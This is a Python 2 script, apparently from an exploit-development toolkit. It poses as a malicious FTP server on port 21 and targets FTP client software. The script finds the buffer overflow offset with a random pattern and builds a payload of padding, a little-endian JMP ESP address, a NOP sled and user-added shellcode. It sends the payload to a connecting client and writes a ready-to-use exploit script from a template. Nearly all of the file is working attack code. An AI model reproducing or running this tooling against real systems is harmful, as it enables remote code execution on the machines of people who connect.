#!/usr/bin/env python 
# -*- coding: utf-8 -*-

import random
import string
import socket 
import time
import readline
from Banner import Banner
import shutil
import fileinput

W='\033[0m'     
R='\033[31m'    
G='\033[0;32m'  
O='\33[37m'     
B='\033[34m'    
P= '\033[35m'   
Y="\033[1;33m" 

class LISTEN_BIND():
        
      def __init__(self): 
            
             global W
             global R
             global G
             global O
             global B
             global P
             global Y 
	     with open('shell_code.py','w') as shell_code:
                 shell_code.write('# pls add your shellcode '+'\n'+'shell_code =()')
             mode = """
                       ========================                          
                         Target  FTP Clinet
                       ========================
                               """
             print R+mode+W          
             time.sleep(2)
             time.sleep(2)
             self.app_name = str(raw_input(O+"\n[?]"+W+B+"application name  : "+W))         
             self.string_ramd() 
             self.Listen_FAKE()
             self.connect_client()
             self.option_ret()
             self._hexadecimal()
             self.import_char()
             self.little_endian()
             self.attack()
             self.auto_write()
             
      def Listen_FAKE(self):
          try: 
                        
              self.ip_server= "0.0.0.0"
              self.port= 21
              self.listen_sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
              self.listen_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
              self.listen_sock.bind((self.ip_server,self.port))
              self.listen_sock.listen(1)
              time.sleep(2)
              #self.listen_sock.settimeout(30)
              print Y+"\n[#]"+W+P+"Buffer_Helper Listen from "+W+R +" 0.0.0.0 "+W+P+" in port"+W,self.port,Y+"[<>]"+W
              time.sleep(2)
              print O+"\t\t\t\n>>>>"+W+Y+" Wating For incoming Connection "+W+O+" >>>>"+W
          except socket.error, exc:               
                time.sleep(3)
                print O+"\n[(!)]"+W+Y+"Connection is Down >> Exception Socket.Error"+W+O+" :"+W +R+"%s\n" %exc+W
                time.sleep(2) 
                print Banner      
                exit()
          except KeyboardInterrupt:  
                 print Banner      
                 exit()
      def string_ramd(self):
          
          try:
	      self.Requst_String = int (raw_input(O+"\n[+]"+W+B+"Enter the length of Pattern :"+W))
	      time.sleep(2)
	      self.Random_String = "".join(random.choice(string.ascii_letters)for i in range(self.Requst_String )).lower()  
              self.Random_String = bytearray(self.Random_String)
	      print Y+"\n[+]"+W+R+"String Pattern is Generated in length:"+W,len(self.Random_String ),#"\n\n",(self.Random_String).strip()
	      print
          except Exception:
              time.sleep(2)
              print Y+"\n[()]"+W+R+"Check input integer Required"+W+Y+"[()]"+W
              return self.string_ramd()		 
          except KeyboardInterrupt:
                  print Banner  
                  exit()
      def connect_client(self):
       
          try:
                
              client , addr =  self.listen_sock.accept()
              print Y+"\n[(-)]"+W+R+"BUFFER_HELPER CONNECTION ACCEPT FROM "+W+'%s:'%(addr[0],),P+"[(+)]"+W  
              client.settimeout(10) 
              while True:                 
                    client.sendall(self.Random_String+'\r\n') 
                    
          except socket.error, exc: 
          
                          print O+"\n[-_-]"+W+R+"Data Send Successful"+W+O+"[-_-]"+W                            
                          time.sleep(1)
                          print O+"\n[(!)]"+W+Y+"Connection is Down >> Exception Socket.Error"+W+O+" :"+W +R+"%s\n" %exc+W
                          time.sleep(1) 
          except KeyboardInterrupt:
                   print Banner
                   exit()
                  
      def option_ret(self):
         
          try:
              continue_1   = "c".lower()            
              return_back  = "b".lower()
              op_sel = str(raw_input(O+"\n[<>]"+W+B+"To Continue Press"+W+R+" C "+W+B+"To Return Back  Press "+W+R+"B"+W+B+": "+W)).lower()
              if op_sel== continue_1 and  len(op_sel)==1:
                   pass
              elif op_sel ==return_back and len(op_sel)==1:
                  self.string_ramd()
                  self.Listen_FAKE()
                  self.connect_client()
                  self.option_ret()
              else:
                  print Y+"\n[-]"+W+R+"Please Enter "+W+B+"C"+W+R+" or "+W+B+"B"+W+Y+"[-]"+W
                  self.option_ret()
          except KeyboardInterrupt:
                   print Banner
                   exit()      
      def _hexadecimal(self):
                                                                                   
          while True:
                 try: 
		    self.hexadecimal =str(raw_input(O+"\n[+]"+W+B+"Enter hexadecimal Crach address: "+W)).upper()
                    self.ASCII1 ="".join(reversed([self.hexadecimal[i:i+2] for i in range(0, len(self.hexadecimal), 2)]))                
		    self.ASCII = ''.join(chr(int(self.ASCII1[i:i+2], 16)) for i in range(0, len(self.ASCII1), 2))
		    if  self.ASCII in  self.Random_String and len(self.ASCII)==4:
		       time.sleep(2)
		       print Y+"\n[+]"+W+P+"The ASCII Value  is "+W+B+": "+W,R+self.ASCII+W
		       time.sleep(2)
		       self.location = self.Random_String.find(self.ASCII)		       
		       print Y+"\n[+]"+W+P+"Exact Satch at Offset"+W+B+" : "+W,self.location	              
                       break
		    else:
	               print Y+"\n[(*)]"+W+R+"THE VALUE  OF THE ADDRESS Not FOUND  IN OUR STRING"+W+Y+"[(*)] "+W
	               time.sleep(2)
	               return self._hexadecimal() 
	                
	         except Exception:
	               print Y+"\n[(*)]"+W+R+"THE VALUE  OF THE ADDRESS Not FOUND "+W+Y+"[(*)] "+W  
	               return self._hexadecimal()                  
		     
	        
                 except KeyboardInterrupt:
                       print  Banner
                       exit() 
      def import_char(self): 
         try:
             
            Bad = "yes".lower()
            Bad_no = "no".lower()                 
            bad_op = str(raw_input(Y+"\n[<>]"+W+R+"To Test Bad_Character Enter "+W+B+"yes "+W+R +"To Skip Enter "+W+B+" no : "+W)).lower()
            
            if bad_op == Bad and len(Bad)==3: 
                self.listen_sock.close()
                banner = """  
                    ========================                          
                      Bad_Character start
                    ========================\n 
                      """
                print B+banner+W 
                with open('.data','w')as data :
                    data3 = data.write(str(self.location))          
                time.sleep(2)
                from Bad_Character import Bad_Character_Clinet             
                run = Bad_Character_Clinet()
            elif bad_op ==Bad_no and len(Bad_no)==2: 
		print R+"\n\t\t!___To Continue Exploit Generate shellcode and post it in shell_code.py file___! \n"+W 
                pass
            else:
              print Y+"\n[-]"+W+R+"Please Enter "+W+B+"yes"+W+R+" or"+W+B+" no"+W+Y+" [-]"+W 
              self.import_char()                   
         except KeyboardInterrupt:
                print  Banner
                exit()                             
      def little_endian(self):
               try:
                    jump= str(raw_input(O+"\n[+]"+W+B+" Enter JMP ESP addrsss HEX  : "+W)).upper()
                    if len(jump) < 4 :
                        print Y+"\n[(*)]"+W+R+"JMP ESP is Required "+W+Y+"[(*)] "+W  
	                return self.little_endian()  
	            else:
	               pass             
                    time.sleep(2)
                    self.jump_address = "".join(reversed([jump[i:i+2] for i in range(0, len(jump), 2)]))
                    self.display =self.jump_address# for print olnly
                    self.display = " ".join('\\x%s'%self.display[i:i+2] for i in range(0, len(self.display), 2))
                    self.display= self.display.replace(" ", "")
                    time.sleep(2)
                    self.jump_address = ('0'*(len(self.jump_address) % 2) +self.jump_address).decode('hex') 
                    print Y+"\n[+]"+W+P+"little endian JMP ESP  is "+W+B+": "+W,R+self.display+W
               except Exception:
	               print Y+"\n[(*)]"+W+R+"TypeError: Non-hexadecimal digit found "+W+Y+"[(*)] "+W  
	               return self.little_endian()                       
               except KeyboardInterrupt:
                    print  Banner
                    exit()
                              
      def attack(self):
             from shell_code import shell_code 
	     try:
	       
                 Start_string = self.location*"A"        
                 self.NO_Operation = len(self.Random_String) - self.location  - len( self.jump_address) 
                 self.NO_Operation = self.NO_Operation*"\x90" 
                 self.count = self.NO_Operation.count("\x90")  
                 attack = Start_string+self.jump_address+ self.NO_Operation +str(shell_code)
                 time.sleep(2) 
                 print Y+'\n[+]'+W+B+'attack'+W+O+' ='+W,len(Start_string),B+'of'+W+R+ "A"+W+O+'+'+W+B+\
                 ' JMP ESP ='+W,Y+self.display+W,O+'+'+W,self.NO_Operation.count("\x90"),B+'of'+W+R+'("\\x90")'+W+O+'+'+W+P+' shellcode'+W
                 time.sleep(2)
                 if len(shell_code) < 50:
                        print P+"\n\t\t\t\t!__________________EXPLOIT__Fail__________________!"+W
                        print B+"\n\t\t\t!__________________Dedicated_No_Shell_Code______________________!"+W
                        exit()
                 else:
                    pass       
                 connect_Attack= self.Listen_FAKE()                                                           
                 client , addr = self.listen_sock.accept()
                 time.sleep(2)
                 print Y+"\n[(-)]"+W+R+"BUFFER_HELPER CONNECTION ACCEPT FROM "+W+'%s:'%(addr[0],),P+"[(+)]"+W 
                 client.settimeout(5)
                 while True:
                        try:          
		           client.sendall(attack +'\r\n')
		        		 	       
                        except Exception:
                           print B+"\n[+]"+W+R+"WE READY TO ATTACK !!"+W+B+"[+]"+W 
                           time.sleep(2)
                           print R+"\n\t\t\t!__________________EXPLOIT__SACUSSED__________________!"+W          
                           break
             except KeyboardInterrupt:
                   Banner  
                   exit()                
      def auto_write(self): 
                from shell_code import shell_code 
                try:                
                  shell =str(shell_code).encode("hex")
                  shell1= "".join("\\x%s"%shell[i:i+2] for i in range(0, len(shell), 2))
                  self.shell_code= "".join('\n"%s"'%shell1[i:i+56] for i in range(0, len(shell1),56))
                  copy_format= shutil.copy("./TemplateExploit/FTP.Client_payload.txt",'./ExploitStore/'+self.app_name+"_Exploit.py")
                  file= './ExploitStore/'+self.app_name+"_Exploit.py"
                  for line in fileinput.FileInput(file,inplace=1):
	                if '# application name :'in line:
		            line = line.rstrip()
		            line = line.replace(line,line+  self.app_name  +'\n')
				 
	                if '_Offset_Byte  =  "A"*'in line:
		            line = line.rstrip()
		            line = line.replace(line,line+ str(self.location)+'\n')
				 
		        if '_JMP_ESP      ='in line:
		            line = line.rstrip()
		            line = line.replace(line,line+'"'+ self.display+'"'+'\n')
				 
	                if '_NO_OPT       ="\\x90"*'in line:
		            line = line.rstrip()
		            line = line.replace(line,line+ str(self.count) +'\n')
		        if '_Shell_Code   = ('in line:
		             line = line.rstrip()
		             line = line.replace(line,line+ self.shell_code+ ')'+'\n')			     
				
		        print line,
		  time.sleep(2)
		  print O+"\n\t!_________The Final Process of this Exploit Written in to "+W,Y+"'ExploitStore'"+W,O+"Folder________!"+W
		  time.sleep(2)     
                  print   Banner
                  exit() 
                except KeyboardInterrupt:    
                     print   Banner                              	
                     exit()
                       
if __name__ == '__main__': 
  LISTEN_BIND()
